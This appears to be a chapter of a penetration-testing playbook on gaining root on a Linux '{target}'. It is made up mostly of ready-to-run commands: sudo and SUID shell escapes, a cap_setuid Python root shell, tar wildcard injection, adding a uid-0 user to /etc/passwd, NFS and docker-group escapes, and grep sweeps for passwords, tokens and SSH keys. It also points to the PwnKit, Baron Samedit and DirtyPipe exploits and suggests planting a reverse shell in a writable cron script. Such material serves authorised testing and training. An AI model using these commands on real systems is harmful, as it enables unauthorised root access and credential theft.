# Linux Privilege Escalation

**Goal: `uid=0(root)` on `{target}`.** Enumerate systematically, don't guess. 90% of Linux privesc is `sudo -l`, SUID binaries, cron jobs, writable files, or a stored credential. Run an automated script AND check the high-value items by hand.

> First move after any foothold: **upgrade to a TTY** (`python3 -c 'import pty;pty.spawn("/bin/bash")'` then the `stty raw -echo; fg` dance — see the Payloads/TTY chapter). Then `id`, `sudo -l`, `hostname`, `uname -a`.

---

## Step 1 — Automated Enumeration

```bash
# Upload and run one of these (host on your box, wget/curl to /tmp, chmod +x)
./linpeas.sh | tee linpeas.out          # the go-to; read the RED/YELLOW hits
./lse.sh -l1                            # linux-smart-enumeration
./pspy64                                # watch cron/other users' processes live (no root needed!)
```

`pspy` is underrated — it reveals root cron jobs and their commands without needing to read `/etc/crontab`.

---

## Step 2 — The Manual Checklist (in priority order)

### 1. sudo rights — check FIRST, every time
```bash
sudo -l
# NOPASSWD entries = free. Look each binary up on GTFOBins:
sudo /usr/bin/find . -exec /bin/sh \; -quit          # find -> shell
sudo vim -c ':!/bin/sh'                              # vim
sudo less /etc/profile      # then type  !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
# (sudo) LD_PRELOAD / LD_LIBRARY_PATH if env_keep is set
sudo PYTHONPATH=/tmp python3 -c 'import evil'
```

**CVE-2021-4034 (PwnKit / pkexec)** and **CVE-2021-3156 (Sudo Baron Samedit)** are near-universal wins on older boxes:
```bash
pkexec --version        # <= 0.105 area -> PwnKit
sudo --version          # < 1.9.5p2   -> Baron Samedit
```

### 2. SUID / SGID binaries
```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```
Take each non-standard SUID binary to **GTFOBins**. Classic examples:
```bash
# If these are SUID:
./find . -exec /bin/sh -p \; -quit
./nmap --interactive        # then !sh   (old nmap)
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash   # via a SUID cp
# bash SUID:
./bash -p                   # -p keeps euid
```

### 3. Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid on python/perl = instant root:
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # if python has cap_setuid+ep
```

### 4. Cron jobs (writable scripts / wildcard / PATH)
```bash
cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null
# Use pspy to catch jobs not in crontab. Look for:
#  - a root cron running a script YOU can write   -> put a reverse shell in it
#  - relative path / PATH hijack                    -> drop a malicious binary earlier in PATH
#  - tar/rsync with a wildcard (*)                  -> wildcard injection
```
Wildcard injection (e.g. root runs `tar czf backup.tar.gz *` in a writable dir):
```bash
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

### 5. Writable /etc/passwd or /etc/shadow
```bash
ls -la /etc/passwd /etc/shadow
# If /etc/passwd is writable, add a root user:
openssl passwd -1 -salt x pass123        # -> $1$x$...
echo 'hacker:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### 6. Stored credentials & config files
```bash
grep -riE 'password|passwd|secret|api_key|token' /var/www /opt /home /etc 2>/dev/null
cat ~/.bash_history ~/.ssh/id_rsa /home/*/.ssh/id_rsa 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l pass 2>/dev/null
# Reuse creds: password from a web config often = root/other user via su/ssh
```

### 7. Kernel exploits (last resort — can crash the box)
```bash
uname -a; cat /etc/os-release
searchsploit linux kernel <version>
# DirtyPipe (5.8-5.16.11), DirtyCow (< 4.8.3), OverlayFS, etc.
```

### 8. NFS root squashing (no_root_squash)
```bash
# On target: cat /etc/exports  -> look for no_root_squash
# On YOUR box (as root), mount the share and drop a SUID binary:
mount -o rw {target}:/share /mnt
cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
# back on target:  /share/rootbash -p
```

### 9. Docker / LXD group & container escape
```bash
id | grep -E 'docker|lxd'
# docker group = root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Access to docker.sock:
cat /proc/self/cgroup | grep -q docker && ls -la /var/run/docker.sock
# lxd group -> mount host fs via a privileged container (well-known escape)
```

---

## Quick One-Liner Sweep

```bash
id; sudo -l 2>/dev/null; echo '---SUID---'; find / -perm -4000 -type f 2>/dev/null; \
echo '---CAPS---'; getcap -r / 2>/dev/null; echo '---CRON---'; cat /etc/crontab; \
echo '---WRITABLE---'; find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys'
```

## Common Mistakes

- **Skipping `sudo -l`.** It's the single highest-yield check and takes one second.
- **Not looking binaries up on GTFOBins.** Every SUID/sudo entry has a known escape — don't reinvent it.
- **Ignoring `pspy`.** Cron-based paths are invisible in a static `crontab` read if the job lives elsewhere.
- **Jumping straight to kernel exploits.** They're the last resort — they crash boxes and cost you time.
- **Not reusing found passwords.** The web-app DB password is very often a system user's password too.
